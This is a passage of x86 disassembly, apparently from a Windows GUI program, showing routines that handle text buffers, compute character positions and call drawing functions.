  405023:	c7 06 70 5d 41 00    	movl   $0x415d70,(%esi)
  405029:	33 db                	xor    %ebx,%ebx
  40502b:	8d 4e 44             	lea    0x44(%esi),%ecx
  40502e:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  405032:	e8 6f dd 00 00       	call   0x412da6
  405037:	53                   	push   %ebx
  405038:	8b ce                	mov    %esi,%ecx
  40503a:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  40503f:	c7 06 08 60 41 00    	movl   $0x416008,(%esi)
  405045:	e8 d6 07 00 00       	call   0x405820
  40504a:	53                   	push   %ebx
  40504b:	8b ce                	mov    %esi,%ecx
  40504d:	e8 ae 07 00 00       	call   0x405800
  405052:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405056:	c7 46 50 3f b5 ff 00 	movl   $0xffb53f,0x50(%esi)
  40505d:	c7 46 4c 17 40 67 00 	movl   $0x674017,0x4c(%esi)
  405064:	89 5e 54             	mov    %ebx,0x54(%esi)
  405067:	88 5e 4a             	mov    %bl,0x4a(%esi)
  40506a:	88 5e 4b             	mov    %bl,0x4b(%esi)
  40506d:	8b c6                	mov    %esi,%eax
  40506f:	5e                   	pop    %esi
  405070:	5b                   	pop    %ebx
  405071:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405078:	83 c4 10             	add    $0x10,%esp
  40507b:	c3                   	ret
  40507c:	90                   	nop
  40507d:	90                   	nop
  40507e:	90                   	nop
  40507f:	90                   	nop
  405080:	56                   	push   %esi
  405081:	8b f1                	mov    %ecx,%esi
  405083:	e8 18 00 00 00       	call   0x4050a0
  405088:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40508d:	74 09                	je     0x405098
  40508f:	56                   	push   %esi
  405090:	e8 03 dc 00 00       	call   0x412c98
  405095:	83 c4 04             	add    $0x4,%esp
  405098:	8b c6                	mov    %esi,%eax
  40509a:	5e                   	pop    %esi
  40509b:	c2 04 00             	ret    $0x4
  40509e:	90                   	nop
  40509f:	90                   	nop
  4050a0:	6a ff                	push   $0xffffffff
  4050a2:	68 a8 38 41 00       	push   $0x4138a8
  4050a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4050ad:	50                   	push   %eax
  4050ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4050b5:	51                   	push   %ecx
  4050b6:	56                   	push   %esi
  4050b7:	8b f1                	mov    %ecx,%esi
  4050b9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4050bd:	c7 06 08 60 41 00    	movl   $0x416008,(%esi)
  4050c3:	8d 4e 44             	lea    0x44(%esi),%ecx
  4050c6:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4050cd:	00 
  4050ce:	e8 ef db 00 00       	call   0x412cc2
  4050d3:	8b ce                	mov    %esi,%ecx
  4050d5:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4050dc:	ff 
  4050dd:	e8 b2 dc 00 00       	call   0x412d94
  4050e2:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4050e6:	5e                   	pop    %esi
  4050e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4050ee:	83 c4 10             	add    $0x10,%esp
  4050f1:	c3                   	ret
  4050f2:	90                   	nop
  4050f3:	90                   	nop
  4050f4:	90                   	nop
  4050f5:	90                   	nop
  4050f6:	90                   	nop
  4050f7:	90                   	nop
  4050f8:	90                   	nop
  4050f9:	90                   	nop
  4050fa:	90                   	nop
  4050fb:	90                   	nop
  4050fc:	90                   	nop
  4050fd:	90                   	nop
  4050fe:	90                   	nop
  4050ff:	90                   	nop
  405100:	b8 a0 5f 41 00       	mov    $0x415fa0,%eax
  405105:	c3                   	ret
  405106:	90                   	nop
  405107:	90                   	nop
  405108:	90                   	nop
  405109:	90                   	nop
  40510a:	90                   	nop
  40510b:	90                   	nop
  40510c:	90                   	nop
  40510d:	90                   	nop
  40510e:	90                   	nop
  40510f:	90                   	nop
  405110:	0f be 44 24 08       	movsbl 0x8(%esp),%eax
  405115:	56                   	push   %esi
  405116:	8b 74 24 08          	mov    0x8(%esp),%esi
  40511a:	83 c0 e0             	add    $0xffffffe0,%eax
  40511d:	57                   	push   %edi
  40511e:	83 f8 20             	cmp    $0x20,%eax
  405121:	89 06                	mov    %eax,(%esi)
  405123:	7d 0d                	jge    0x405132
  405125:	8b 51 68             	mov    0x68(%ecx),%edx
  405128:	8b 79 60             	mov    0x60(%ecx),%edi
  40512b:	03 d7                	add    %edi,%edx
  40512d:	0f af d0             	imul   %eax,%edx
  405130:	eb 1a                	jmp    0x40514c
  405132:	8b 51 68             	mov    0x68(%ecx),%edx
  405135:	8b 79 60             	mov    0x60(%ecx),%edi
  405138:	83 f8 40             	cmp    $0x40,%eax
  40513b:	7d 07                	jge    0x405144
  40513d:	03 d7                	add    %edi,%edx
  40513f:	8d 78 e0             	lea    -0x20(%eax),%edi
  405142:	eb 05                	jmp    0x405149
  405144:	03 d7                	add    %edi,%edx
  405146:	8d 78 c0             	lea    -0x40(%eax),%edi
  405149:	0f af d7             	imul   %edi,%edx
  40514c:	89 16                	mov    %edx,(%esi)
  40514e:	8b 79 6c             	mov    0x6c(%ecx),%edi
  405151:	03 79 64             	add    0x64(%ecx),%edi
  405154:	99                   	cltd
  405155:	83 e2 1f             	and    $0x1f,%edx
  405158:	03 c2                	add    %edx,%eax
  40515a:	8b 16                	mov    (%esi),%edx
  40515c:	c1 f8 05             	sar    $0x5,%eax
  40515f:	0f af f8             	imul   %eax,%edi
  405162:	89 7e 04             	mov    %edi,0x4(%esi)
  405165:	8b 41 60             	mov    0x60(%ecx),%eax
  405168:	03 c2                	add    %edx,%eax
  40516a:	89 46 08             	mov    %eax,0x8(%esi)
  40516d:	8b 49 64             	mov    0x64(%ecx),%ecx
  405170:	8b c7                	mov    %edi,%eax
  405172:	5f                   	pop    %edi
  405173:	03 c8                	add    %eax,%ecx
  405175:	32 c0                	xor    %al,%al
  405177:	89 4e 0c             	mov    %ecx,0xc(%esi)
  40517a:	5e                   	pop    %esi
  40517b:	c2 08 00             	ret    $0x8
  40517e:	90                   	nop
  40517f:	90                   	nop
  405180:	53                   	push   %ebx
  405181:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405185:	56                   	push   %esi
  405186:	8b f1                	mov    %ecx,%esi
  405188:	57                   	push   %edi
  405189:	53                   	push   %ebx
  40518a:	8b 46 44             	mov    0x44(%esi),%eax
  40518d:	8d 7e 44             	lea    0x44(%esi),%edi
  405190:	50                   	push   %eax
  405191:	ff 15 b0 55 41 00    	call   *0x4155b0
  405197:	83 c4 08             	add    $0x8,%esp
  40519a:	85 c0                	test   %eax,%eax
  40519c:	74 5a                	je     0x4051f8
  40519e:	53                   	push   %ebx
  40519f:	8b cf                	mov    %edi,%ecx
  4051a1:	e8 fa db 00 00       	call   0x412da0
  4051a6:	8b 46 74             	mov    0x74(%esi),%eax
  4051a9:	c6 46 48 01          	movb   $0x1,0x48(%esi)
  4051ad:	85 c0                	test   %eax,%eax
  4051af:	75 09                	jne    0x4051ba
  4051b1:	6a 00                	push   $0x0
  4051b3:	8b ce                	mov    %esi,%ecx
  4051b5:	e8 46 06 00 00       	call   0x405800
  4051ba:	8b 46 70             	mov    0x70(%esi),%eax
  4051bd:	85 c0                	test   %eax,%eax
  4051bf:	75 09                	jne    0x4051ca
  4051c1:	6a 00                	push   $0x0
  4051c3:	8b ce                	mov    %esi,%ecx
  4051c5:	e8 56 06 00 00       	call   0x405820
  4051ca:	8a 46 49             	mov    0x49(%esi),%al
  4051cd:	84 c0                	test   %al,%al
  4051cf:	74 19                	je     0x4051ea
  4051d1:	8b 46 20             	mov    0x20(%esi),%eax
  4051d4:	68 21 01 00 00       	push   $0x121
  4051d9:	6a 00                	push   $0x0
  4051db:	6a 00                	push   $0x0
  4051dd:	50                   	push   %eax
  4051de:	ff 15 38 56 41 00    	call   *0x415638
  4051e4:	5f                   	pop    %edi
  4051e5:	5e                   	pop    %esi
  4051e6:	5b                   	pop    %ebx
  4051e7:	c2 04 00             	ret    $0x4
  4051ea:	8b 4e 20             	mov    0x20(%esi),%ecx
  4051ed:	6a 01                	push   $0x1
  4051ef:	6a 00                	push   $0x0
  4051f1:	51                   	push   %ecx
  4051f2:	ff 15 3c 56 41 00    	call   *0x41563c
  4051f8:	5f                   	pop    %edi
  4051f9:	5e                   	pop    %esi
  4051fa:	5b                   	pop    %ebx
  4051fb:	c2 04 00             	ret    $0x4
  4051fe:	90                   	nop
  4051ff:	90                   	nop
  405200:	8b 44 24 04          	mov    0x4(%esp),%eax
  405204:	85 c0                	test   %eax,%eax
  405206:	75 20                	jne    0x405228
  405208:	b8 02 00 00 00       	mov    $0x2,%eax
  40520d:	c7 41 60 0e 00 00 00 	movl   $0xe,0x60(%ecx)
  405214:	c7 41 64 14 00 00 00 	movl   $0x14,0x64(%ecx)
  40521b:	89 41 68             	mov    %eax,0x68(%ecx)
  40521e:	89 41 6c             	mov    %eax,0x6c(%ecx)
  405221:	c7 41 58 86 00 00 00 	movl   $0x86,0x58(%ecx)
  405228:	c2 04 00             	ret    $0x4
  40522b:	90                   	nop
  40522c:	90                   	nop
  40522d:	90                   	nop
  40522e:	90                   	nop
  40522f:	90                   	nop
  405230:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405236:	6a ff                	push   $0xffffffff
  405238:	68 18 39 41 00       	push   $0x413918
  40523d:	50                   	push   %eax
  40523e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405245:	83 ec 18             	sub    $0x18,%esp
  405248:	53                   	push   %ebx
  405249:	55                   	push   %ebp
  40524a:	56                   	push   %esi
  40524b:	8b f1                	mov    %ecx,%esi
  40524d:	57                   	push   %edi
  40524e:	8b 56 70             	mov    0x70(%esi),%edx
  405251:	83 fa 01             	cmp    $0x1,%edx
  405254:	0f 85 0f 01 00 00    	jne    0x405369
  40525a:	38 56 4b             	cmp    %dl,0x4b(%esi)
  40525d:	75 26                	jne    0x405285
  40525f:	8b 46 44             	mov    0x44(%esi),%eax
  405262:	8d 7e 44             	lea    0x44(%esi),%edi
  405265:	8b 48 f8             	mov    -0x8(%eax),%ecx
  405268:	8b 46 74             	mov    0x74(%esi),%eax
  40526b:	3b c8                	cmp    %eax,%ecx
  40526d:	7d 16                	jge    0x405285
  40526f:	2b c1                	sub    %ecx,%eax
  405271:	85 c0                	test   %eax,%eax
  405273:	7e 10                	jle    0x405285
  405275:	8b d8                	mov    %eax,%ebx
  405277:	8a 4e 40             	mov    0x40(%esi),%cl
  40527a:	51                   	push   %ecx
  40527b:	8b cf                	mov    %edi,%ecx
  40527d:	e8 b4 db 00 00       	call   0x412e36
  405282:	4b                   	dec    %ebx
  405283:	75 f2                	jne    0x405277
  405285:	8b 46 78             	mov    0x78(%esi),%eax
  405288:	8d 7e 44             	lea    0x44(%esi),%edi
  40528b:	85 c0                	test   %eax,%eax
  40528d:	75 5f                	jne    0x4052ee
  40528f:	8b 17                	mov    (%edi),%edx
  405291:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  405295:	6a 01                	push   $0x1
  405297:	51                   	push   %ecx
  405298:	8a 02                	mov    (%edx),%al
  40529a:	8b cf                	mov    %edi,%ecx
  40529c:	88 44 24 18          	mov    %al,0x18(%esp)
  4052a0:	e8 8b db 00 00       	call   0x412e30
  4052a5:	8b 54 24 10          	mov    0x10(%esp),%edx
  4052a9:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4052b0:	00 
  4052b1:	52                   	push   %edx
  4052b2:	50                   	push   %eax
  4052b3:	8d 44 24 20          	lea    0x20(%esp),%eax
  4052b7:	50                   	push   %eax
  4052b8:	e8 6d db 00 00       	call   0x412e2a
  4052bd:	50                   	push   %eax
  4052be:	8b cf                	mov    %edi,%ecx
  4052c0:	c6 44 24 34 01       	movb   $0x1,0x34(%esp)
  4052c5:	e8 d0 da 00 00       	call   0x412d9a
  4052ca:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4052ce:	c6 44 24 30 00       	movb   $0x0,0x30(%esp)
  4052d3:	e8 ea d9 00 00       	call   0x412cc2
  4052d8:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4052dc:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  4052e3:	ff 
  4052e4:	e8 d9 d9 00 00       	call   0x412cc2
  4052e9:	e9 64 02 00 00       	jmp    0x405552
  4052ee:	8b 0f                	mov    (%edi),%ecx
  4052f0:	8d 54 24 10          	lea    0x10(%esp),%edx
  4052f4:	8b 41 f8             	mov    -0x8(%ecx),%eax
  4052f7:	8b cf                	mov    %edi,%ecx
  4052f9:	48                   	dec    %eax
  4052fa:	50                   	push   %eax
  4052fb:	52                   	push   %edx
  4052fc:	e8 23 db 00 00       	call   0x412e24
  405301:	8b e8                	mov    %eax,%ebp
  405303:	8d 44 24 18          	lea    0x18(%esp),%eax
  405307:	6a 01                	push   $0x1
  405309:	50                   	push   %eax
  40530a:	8b cf                	mov    %edi,%ecx
  40530c:	c7 44 24 38 02 00 00 	movl   $0x2,0x38(%esp)
  405313:	00 
  405314:	e8 05 db 00 00       	call   0x412e1e
  405319:	55                   	push   %ebp
  40531a:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40531e:	b3 03                	mov    $0x3,%bl
  405320:	50                   	push   %eax
  405321:	51                   	push   %ecx
  405322:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  405326:	e8 ed da 00 00       	call   0x412e18
  40532b:	50                   	push   %eax
  40532c:	8b cf                	mov    %edi,%ecx
  40532e:	c6 44 24 34 04       	movb   $0x4,0x34(%esp)
  405333:	e8 62 da 00 00       	call   0x412d9a
  405338:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40533c:	88 5c 24 30          	mov    %bl,0x30(%esp)
  405340:	e8 7d d9 00 00       	call   0x412cc2
  405345:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  405349:	c6 44 24 30 02       	movb   $0x2,0x30(%esp)
  40534e:	e8 6f d9 00 00       	call   0x412cc2
  405353:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405357:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  40535e:	ff 
  40535f:	e8 5e d9 00 00       	call   0x412cc2
  405364:	e9 e9 01 00 00       	jmp    0x405552
  405369:	0f 8e e3 01 00 00    	jle    0x405552
  40536f:	80 7e 4b 01          	cmpb   $0x1,0x4b(%esi)
  405373:	75 29                	jne    0x40539e
  405375:	8b 46 44             	mov    0x44(%esi),%eax
  405378:	8d 7e 44             	lea    0x44(%esi),%edi
  40537b:	8b 48 f8             	mov    -0x8(%eax),%ecx
  40537e:	8b 46 74             	mov    0x74(%esi),%eax
  405381:	0f af c2             	imul   %edx,%eax
  405384:	3b c8                	cmp    %eax,%ecx
  405386:	7d 16                	jge    0x40539e
  405388:	2b c1                	sub    %ecx,%eax
  40538a:	85 c0                	test   %eax,%eax
  40538c:	7e 10                	jle    0x40539e
  40538e:	8b d8                	mov    %eax,%ebx
  405390:	8a 4e 40             	mov    0x40(%esi),%cl
  405393:	51                   	push   %ecx
  405394:	8b cf                	mov    %edi,%ecx
  405396:	e8 9b da 00 00       	call   0x412e36
  40539b:	4b                   	dec    %ebx
  40539c:	75 f2                	jne    0x405390
  40539e:	8b 46 78             	mov    0x78(%esi),%eax
  4053a1:	83 f8 03             	cmp    $0x3,%eax
  4053a4:	0f 85 86 00 00 00    	jne    0x405430
  4053aa:	8b 56 74             	mov    0x74(%esi),%edx
  4053ad:	8d 7e 44             	lea    0x44(%esi),%edi
  4053b0:	8d 44 24 10          	lea    0x10(%esp),%eax
  4053b4:	52                   	push   %edx
  4053b5:	50                   	push   %eax
  4053b6:	8b cf                	mov    %edi,%ecx
  4053b8:	e8 61 da 00 00       	call   0x412e1e
  4053bd:	8b 0f                	mov    (%edi),%ecx
  4053bf:	8d 54 24 18          	lea    0x18(%esp),%edx
  4053c3:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%esp)
  4053ca:	00 
  4053cb:	8b 41 f8             	mov    -0x8(%ecx),%eax
  4053ce:	8b 4e 74             	mov    0x74(%esi),%ecx
  4053d1:	2b c1                	sub    %ecx,%eax
  4053d3:	8b cf                	mov    %edi,%ecx
  4053d5:	50                   	push   %eax
  4053d6:	52                   	push   %edx
  4053d7:	e8 48 da 00 00       	call   0x412e24
  4053dc:	50                   	push   %eax
  4053dd:	8d 44 24 14          	lea    0x14(%esp),%eax
  4053e1:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4053e5:	b3 06                	mov    $0x6,%bl
  4053e7:	50                   	push   %eax
  4053e8:	51                   	push   %ecx
  4053e9:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  4053ed:	e8 26 da 00 00       	call   0x412e18
  4053f2:	50                   	push   %eax
  4053f3:	8b cf                	mov    %edi,%ecx
  4053f5:	c6 44 24 34 07       	movb   $0x7,0x34(%esp)
  4053fa:	e8 9b d9 00 00       	call   0x412d9a
  4053ff:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  405403:	88 5c 24 30          	mov    %bl,0x30(%esp)
  405407:	e8 b6 d8 00 00       	call   0x412cc2
  40540c:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  405410:	c6 44 24 30 05       	movb   $0x5,0x30(%esp)
  405415:	e8 a8 d8 00 00       	call   0x412cc2
  40541a:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40541e:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  405425:	ff 
  405426:	e8 97 d8 00 00       	call   0x412cc2
  40542b:	e9 22 01 00 00       	jmp    0x405552
  405430:	83 f8 02             	cmp    $0x2,%eax
  405433:	75 7f                	jne    0x4054b4
  405435:	8b 56 74             	mov    0x74(%esi),%edx
  405438:	8d 7e 44             	lea    0x44(%esi),%edi
  40543b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40543f:	52                   	push   %edx
  405440:	50                   	push   %eax
  405441:	8b cf                	mov    %edi,%ecx
  405443:	e8 dc d9 00 00       	call   0x412e24
  405448:	8b 4e 74             	mov    0x74(%esi),%ecx
  40544b:	8d 54 24 24          	lea    0x24(%esp),%edx
  40544f:	51                   	push   %ecx
  405450:	52                   	push   %edx
  405451:	8b cf                	mov    %edi,%ecx
  405453:	c7 44 24 38 08 00 00 	movl   $0x8,0x38(%esp)
  40545a:	00 
  40545b:	e8 d0 d9 00 00       	call   0x412e30
  405460:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  405464:	8d 54 24 20          	lea    0x20(%esp),%edx
  405468:	51                   	push   %ecx
  405469:	b3 09                	mov    $0x9,%bl
  40546b:	50                   	push   %eax
  40546c:	52                   	push   %edx
  40546d:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  405471:	e8 a2 d9 00 00       	call   0x412e18
  405476:	50                   	push   %eax
  405477:	8b cf                	mov    %edi,%ecx
  405479:	c6 44 24 34 0a       	movb   $0xa,0x34(%esp)
  40547e:	e8 17 d9 00 00       	call   0x412d9a
  405483:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  405487:	88 5c 24 30          	mov    %bl,0x30(%esp)
  40548b:	e8 32 d8 00 00       	call   0x412cc2
  405490:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  405494:	c6 44 24 30 08       	movb   $0x8,0x30(%esp)
  405499:	e8 24 d8 00 00       	call   0x412cc2
  40549e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4054a2:	c7 44 24 30 ff ff ff 	movl   $0xffffffff,0x30(%esp)
  4054a9:	ff 
  4054aa:	e8 13 d8 00 00       	call   0x412cc2
  4054af:	e9 9e 00 00 00       	jmp    0x405552
  4054b4:	85 c0                	test   %eax,%eax
  4054b6:	75 4b                	jne    0x405503
  4054b8:	8b 46 44             	mov    0x44(%esi),%eax
  4054bb:	8d 6e 44             	lea    0x44(%esi),%ebp
  4054be:	8b 4e 74             	mov    0x74(%esi),%ecx
  4054c1:	8b 78 f8             	mov    -0x8(%eax),%edi
  4054c4:	8b c7                	mov    %edi,%eax
  4054c6:	99                   	cltd
  4054c7:	f7 f9                	idiv   %ecx
  4054c9:	85 c0                	test   %eax,%eax
  4054cb:	74 04                	je     0x4054d1
  4054cd:	3b f9                	cmp    %ecx,%edi
  4054cf:	7d 05                	jge    0x4054d6
  4054d1:	b8 01 00 00 00       	mov    $0x1,%eax
  4054d6:	33 ff                	xor    %edi,%edi
  4054d8:	85 c0                	test   %eax,%eax
  4054da:	7e 76                	jle    0x405552
  4054dc:	8b d8                	mov    %eax,%ebx
  4054de:	8b 55 00             	mov    0x0(%ebp),%edx
  4054e1:	03 cf                	add    %edi,%ecx
  4054e3:	8a 04 17             	mov    (%edi,%edx,1),%al
  4054e6:	50                   	push   %eax
  4054e7:	51                   	push   %ecx
  4054e8:	8b cd                	mov    %ebp,%ecx
  4054ea:	e8 23 d9 00 00       	call   0x412e12
  4054ef:	6a 01                	push   $0x1
  4054f1:	57                   	push   %edi
  4054f2:	8b cd                	mov    %ebp,%ecx
  4054f4:	e8 13 d9 00 00       	call   0x412e0c
  4054f9:	8b 4e 74             	mov    0x74(%esi),%ecx
  4054fc:	03 f9                	add    %ecx,%edi
  4054fe:	4b                   	dec    %ebx
  4054ff:	75 dd                	jne    0x4054de
  405501:	eb 4f                	jmp    0x405552
  405503:	83 f8 01             	cmp    $0x1,%eax
  405506:	75 4a                	jne    0x405552
  405508:	8b 4e 44             	mov    0x44(%esi),%ecx
  40550b:	8d 6e 44             	lea    0x44(%esi),%ebp
  40550e:	8b 79 f8             	mov    -0x8(%ecx),%edi
  405511:	8b 4e 74             	mov    0x74(%esi),%ecx
  405514:	8b c7                	mov    %edi,%eax
  405516:	99                   	cltd
  405517:	f7 f9                	idiv   %ecx
  405519:	85 c0                	test   %eax,%eax
  40551b:	74 43                	je     0x405560
  40551d:	3b f9                	cmp    %ecx,%edi
  40551f:	7c 3f                	jl     0x405560
  405521:	33 ff                	xor    %edi,%edi
  405523:	85 c0                	test   %eax,%eax
  405525:	7e 2b                	jle    0x405552
  405527:	8b d8                	mov    %eax,%ebx
  405529:	8b 55 00             	mov    0x0(%ebp),%edx
  40552c:	03 cf                	add    %edi,%ecx
  40552e:	8a 44 11 ff          	mov    -0x1(%ecx,%edx,1),%al
  405532:	8b cd                	mov    %ebp,%ecx
  405534:	50                   	push   %eax
  405535:	57                   	push   %edi
  405536:	e8 d7 d8 00 00       	call   0x412e12
  40553b:	8b 4e 74             	mov    0x74(%esi),%ecx
  40553e:	6a 01                	push   $0x1
  405540:	03 cf                	add    %edi,%ecx
  405542:	51                   	push   %ecx
  405543:	8b cd                	mov    %ebp,%ecx
  405545:	e8 c2 d8 00 00       	call   0x412e0c
  40554a:	8b 4e 74             	mov    0x74(%esi),%ecx
  40554d:	03 f9                	add    %ecx,%edi
  40554f:	4b                   	dec    %ebx
  405550:	75 d7                	jne    0x405529
  405552:	8b 56 20             	mov    0x20(%esi),%edx
  405555:	6a 01                	push   $0x1
  405557:	6a 00                	push   $0x0
  405559:	52                   	push   %edx
  40555a:	ff 15 3c 56 41 00    	call   *0x41563c
  405560:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  405564:	5f                   	pop    %edi
  405565:	5e                   	pop    %esi
  405566:	5d                   	pop    %ebp
  405567:	5b                   	pop    %ebx
  405568:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40556f:	83 c4 24             	add    $0x24,%esp
  405572:	c2 04 00             	ret    $0x4
  405575:	90                   	nop
  405576:	90                   	nop
  405577:	90                   	nop
  405578:	90                   	nop
  405579:	90                   	nop
  40557a:	90                   	nop
  40557b:	90                   	nop
  40557c:	90                   	nop
  40557d:	90                   	nop
  40557e:	90                   	nop
  40557f:	90                   	nop
  405580:	6a ff                	push   $0xffffffff
  405582:	68 43 39 41 00       	push   $0x413943
  405587:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40558d:	50                   	push   %eax
  40558e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405595:	81 ec c4 00 00 00    	sub    $0xc4,%esp
  40559b:	53                   	push   %ebx
  40559c:	55                   	push   %ebp
  40559d:	56                   	push   %esi
  40559e:	8b f1                	mov    %ecx,%esi
  4055a0:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4055a4:	8b 4e 20             	mov    0x20(%esi),%ecx
  4055a7:	50                   	push   %eax
  4055a8:	51                   	push   %ecx
  4055a9:	ff 15 5c 56 41 00    	call   *0x41565c
  4055af:	8b 56 44             	mov    0x44(%esi),%edx
  4055b2:	33 ed                	xor    %ebp,%ebp
  4055b4:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4055b8:	8b 5a f8             	mov    -0x8(%edx),%ebx
  4055bb:	3b dd                	cmp    %ebp,%ebx
  4055bd:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  4055c1:	0f 84 02 02 00 00    	je     0x4057c9
  4055c7:	57                   	push   %edi
  4055c8:	56                   	push   %esi
  4055c9:	8d 8c 24 84 00 00 00 	lea    0x84(%esp),%ecx
  4055d0:	e8 fb d7 00 00       	call   0x412dd0
  4055d5:	8b 46 50             	mov    0x50(%esi),%eax
  4055d8:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  4055db:	8b 56 54             	mov    0x54(%esi),%edx
  4055de:	89 ac 24 dc 00 00 00 	mov    %ebp,0xdc(%esp)
  4055e5:	c7 44 24 40 3f b5 ff 	movl   $0xffb53f,0x40(%esp)
  4055ec:	00 
  4055ed:	89 44 24 44          	mov    %eax,0x44(%esp)
  4055f1:	c7 44 24 48 17 40 67 	movl   $0x674017,0x48(%esp)
  4055f8:	00 
  4055f9:	89 4c 24 4c          	mov    %ecx,0x4c(%esp)
  4055fd:	89 6c 24 50          	mov    %ebp,0x50(%esp)
  405601:	89 54 24 54          	mov    %edx,0x54(%esp)
  405605:	e8 50 d8 00 00       	call   0x412e5a
  40560a:	8b 56 58             	mov    0x58(%esi),%edx
  40560d:	8b 40 08             	mov    0x8(%eax),%eax
  405610:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  405614:	6a 03                	push   $0x3
  405616:	51                   	push   %ecx
  405617:	55                   	push   %ebp
  405618:	52                   	push   %edx
  405619:	50                   	push   %eax
  40561a:	ff 15 2c 50 41 00    	call   *0x41502c
  405620:	8b f8                	mov    %eax,%edi
  405622:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  405626:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  40562a:	e8 25 d8 00 00       	call   0x412e54
  40562f:	8b 8c 24 84 00 00 00 	mov    0x84(%esp),%ecx
  405636:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  40563d:	f7 d8                	neg    %eax
  40563f:	1b c0                	sbb    %eax,%eax
  405641:	c6 84 24 dc 00 00 00 	movb   $0x1,0xdc(%esp)
  405648:	01 
  405649:	23 c1                	and    %ecx,%eax
  40564b:	50                   	push   %eax
  40564c:	ff 15 58 50 41 00    	call   *0x415058
  405652:	50                   	push   %eax
  405653:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  405657:	e8 f2 d7 00 00       	call   0x412e4e
  40565c:	57                   	push   %edi
  40565d:	e8 80 d7 00 00       	call   0x412de2
  405662:	85 c0                	test   %eax,%eax
  405664:	74 03                	je     0x405669
  405666:	8b 40 04             	mov    0x4(%eax),%eax
  405669:	50                   	push   %eax
  40566a:	8b 44 24 28          	mov    0x28(%esp),%eax
  40566e:	50                   	push   %eax
  40566f:	e8 d4 d7 00 00       	call   0x412e48
  405674:	8b 4e 54             	mov    0x54(%esi),%ecx
  405677:	89 44 24 38          	mov    %eax,0x38(%esp)
  40567b:	51                   	push   %ecx
  40567c:	33 ff                	xor    %edi,%edi
  40567e:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  405685:	00 
  405686:	ff 15 74 50 41 00    	call   *0x415074
  40568c:	89 44 24 34          	mov    %eax,0x34(%esp)
  405690:	50                   	push   %eax
  405691:	8b 84 24 88 00 00 00 	mov    0x88(%esp),%eax
  405698:	8d 54 24 74          	lea    0x74(%esp),%edx
  40569c:	52                   	push   %edx
  40569d:	50                   	push   %eax
  40569e:	ff 15 34 56 41 00    	call   *0x415634
  4056a4:	33 c0                	xor    %eax,%eax
  4056a6:	85 db                	test   %ebx,%ebx
  4056a8:	89 44 24 18          	mov    %eax,0x18(%esp)
  4056ac:	0f 8e be 00 00 00    	jle    0x405770
  4056b2:	8b 4e 44             	mov    0x44(%esi),%ecx
  4056b5:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  4056b8:	8d 4c 24 60          	lea    0x60(%esp),%ecx
  4056bc:	88 54 24 3c          	mov    %dl,0x3c(%esp)
  4056c0:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4056c4:	50                   	push   %eax
  4056c5:	51                   	push   %ecx
  4056c6:	8b ce                	mov    %esi,%ecx
  4056c8:	e8 43 fa ff ff       	call   0x405110
  4056cd:	8b 4e 64             	mov    0x64(%esi),%ecx
  4056d0:	8b 56 6c             	mov    0x6c(%esi),%edx
  4056d3:	8b 46 68             	mov    0x68(%esi),%eax
  4056d6:	03 ca                	add    %edx,%ecx
  4056d8:	8b 56 60             	mov    0x60(%esi),%edx
  4056db:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4056df:	03 d0                	add    %eax,%edx
  4056e1:	8d 44 24 20          	lea    0x20(%esp),%eax
  4056e5:	f7 d8                	neg    %eax
  4056e7:	1b c0                	sbb    %eax,%eax
  4056e9:	68 20 00 cc 00       	push   $0xcc0020
  4056ee:	23 c3                	and    %ebx,%eax
